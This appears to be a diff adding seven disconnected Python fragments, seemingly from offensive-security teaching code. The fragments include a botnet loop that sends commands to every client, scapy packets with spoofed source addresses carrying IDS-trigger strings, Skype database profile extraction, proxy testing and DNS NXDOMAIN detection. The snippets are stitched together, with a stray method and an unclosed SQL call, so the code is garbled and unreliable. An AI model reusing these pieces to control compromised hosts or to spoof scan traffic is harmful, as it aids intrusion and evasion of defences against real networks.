@@ -1,0 +1,7 @@
+def send_command(s, cmd): \n     s.sendline(cmd) \n     s.prompt()
+def printProfile(skypeDB): \n     conn = sqlite3.connect(skypeDB) \n     c = conn.cursor() \n     c.execute("SELECT fullname, skypename, city, country,  datetime(profile_timestamp,'unixepoch') FROM Accounts;" \n
+    def __repr__(self): \n         return self.title
+def testProxy(url, proxy): \n     browser = mechanize.Browser() \n     browser.set_proxies(proxy) \n     page = browser.open(url) \n     source_code = page.read() \n
+def dnsQRTest(pkt): \n     if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53: \n         rcode = pkt.getlayer(DNS).rcode \n         qname = pkt.getlayer(DNSQR).qname \n         if rcode == 3: \n             return True \n         else: \n             return False \n
+def scanTest(src, dst, iface, count): \n     pkt = IP(src=src, dst=dst) / UDP(dport=7) /Raw(load='cybercop') \n     send(pkt) \n  \n     pkt = IP(src=src, dst=dst) / UDP(dport=10080)  /Raw(load='Amanda') \n     send(pkt, iface=iface, count=count) \n
+def botnetCommand(command): \n     for client in botNet: \n         output = client.send_command(command) \n
